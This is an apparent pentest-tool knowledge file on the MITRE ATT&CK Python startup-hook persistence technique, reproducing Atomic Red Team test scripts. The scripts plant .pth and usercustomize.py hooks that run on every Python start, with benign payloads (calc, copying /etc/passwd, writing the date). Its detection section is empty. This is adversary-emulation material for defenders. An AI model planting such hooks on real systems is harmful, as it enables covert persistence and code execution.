---
name: "T1546.018_python-startup-hooks"
description: "Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1546.018
  - persistence
  - privilege-escalation
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1546.018"
tactic: "persistence"
all_tactics:
  - persistence
  - privilege-escalation
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1546/018"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1546
  - T1546.001
  - T1546.002
  - T1546.003
  - T1546.004
  - T1546.005
  - T1546.006
  - T1546.007
  - T1546.008
  - T1546.009
  - T1546.010
  - T1546.011
  - T1546.012
  - T1546.013
  - T1546.014
  - T1546.015
  - T1546.016
  - T1546.017
prerequisites:
  - T1546
severity_boost:
  T1546: "Chain with T1546 for deeper attack path"
  T1546.001: "Chain with T1546.001 for deeper attack path"
  T1546.002: "Chain with T1546.002 for deeper attack path"
---

# T1546.018 Python Startup Hooks

> **Sub-technique of:** T1546

## High-Level Description

Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked.

Path configuration files are designed to extend Python’s module search paths through the use of import statements. If a `.pth` file is placed in Python's `site-packages` or `dist-packages` directories, any lines beginning with `import` will be executed automatically on Python invocation. Similarly, if `sitecustomize.py` or `usercustomize.py` is present in the Python path, these files will be imported during interpreter startup, and any code they contain will be executed.

Adversaries may abuse these mechanisms to establish persistence on systems where Python is widely used (e.g., for automation or scripting in production environments).

## Kill Chain Phase

- Persistence (TA0003)
- Privilege Escalation (TA0004)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Python Startup Hooks technique is applicable to target environment
- [ ] Check Linux systems for indicators of Python Startup Hooks
- [ ] Check macOS systems for indicators of Python Startup Hooks
- [ ] Check Windows systems for indicators of Python Startup Hooks
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Python Startup Hook - atomic_hook.pth (Windows)

Executes code by placing a .pth file in the site-packages directory. 
Supports python.exe and python3.exe via input arguments.

**Supported Platforms:** windows

```powershell
$TempDir = Join-Path $env:TEMP "atomic_pth_win"
New-Item -ItemType Directory -Path $TempDir -Force
& "#{python_exe}" -m venv "$TempDir\env"
$SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
"import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
& "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
```

**Dependencies:**
- Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Atomic Test 2: Python Startup Hook - usercustomize.py (Windows)

Executes code via usercustomize.py. This is a per-user persistence mechanism 
that does not require Administrative privileges.

**Supported Platforms:** windows

```powershell
$UserDir = & "#{python_exe}" -c "import site; print(site.getusersitepackages())"
if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
"import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
Get-ChildItem -Path "$UserDir"
& "#{python_exe}" -c "print('Triggering Hook via usercustomize...')"
```

**Dependencies:**
- Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Atomic Test 3: Python Startup Hook - atomic_hook.pth (Linux)

Executes code by creating atomic_hook.pth in the site-packages directory. 
This script runs automatically for every user on the system when Python starts.

**Supported Platforms:** linux

```bash
TEMPDIR="/tmp/atomic_sitecust_posix"
mkdir -p "$TEMPDIR"
"#{python_exe}" -m venv "$TEMPDIR/env"
SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
ls -la "$SITE_PACKAGES/atomic_hook.pth"
"$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
```

**Dependencies:**
- Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Atomic Test 4: Python Startup Hook - atomic_hook.pth (macOS)

Creates a Python startup hook using a .pth file inside a virtual environment on macOS.

**Supported Platforms:** macos

```bash
PYTHON_EXE=$(command -v #{python_exe} || command -v python)
TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
$PYTHON_EXE -m venv "$TEMPDIR/env"
SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
"$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
```

**Dependencies:**
- Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Atomic Test 5: Python Startup Hook - usercustomize.py (Linux / MacOS)

Executes code via usercustomize.py. This is a per-user persistence mechanism 
that does not require root privileges.

**Supported Platforms:** linux, macos

```bash
PYTHON_EXE=$(command -v #{python_exe} || command -v python)
USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
mkdir -p "$USER_PACKAGES"
echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
$PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
```

**Dependencies:**
- Python must be installed and the specified binary (#{python_exe}) must be in the PATH.


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Python Startup Hooks by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1546.018 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Linux Python Startup Hook Persistence via .pth and Customize Files (T1546.018)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Python Startup Hooks technique applicable | Low | Persistence |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-276 | Incorrect Default Permissions |


## References

- [Python Site Configuration Hook](https://docs.python.org/3/library/site.html)
- [DFIR Python Persistence 2025](https://dfir.ch/posts/publish_python_pth_extension/)
- [Volexity GlobalProtect CVE 2024](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/)
- [Atomic Red Team - T1546.018](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1546.018)
- [MITRE ATT&CK - T1546.018](https://attack.mitre.org/techniques/T1546/018)
